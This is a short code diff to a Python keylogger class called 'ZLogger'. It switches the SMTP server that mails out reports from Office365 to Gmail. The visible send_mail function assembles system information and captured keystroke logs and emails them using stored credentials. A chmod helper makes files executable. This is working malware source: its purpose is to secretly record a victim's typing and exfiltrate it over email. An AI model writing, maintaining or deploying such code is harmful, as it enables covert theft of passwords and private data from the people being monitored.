@@ -48,7 +48,7 @@ class Keylogger:
     def send_mail(self, message):
 
         message = "Subject: ZLogger Report\n\n" + "Report From:\n\n" + self.system_info + "\n\nLogs:\n" + message
-        server = smtplib.SMTP("smtp.office365.com", 587)
+        server = smtplib.SMTP("smtp.gmail.com", 587)
         server.starttls()
         server.login(self.email, self.password)
         server.sendmail(self.email, self.email, message)
@@ -98,4 +98,3 @@ class Keylogger:
 
     def chmod_to_exec(self, file):
         os.chmod(file, os.stat(file).st_mode | stat.S_IEXEC)
-
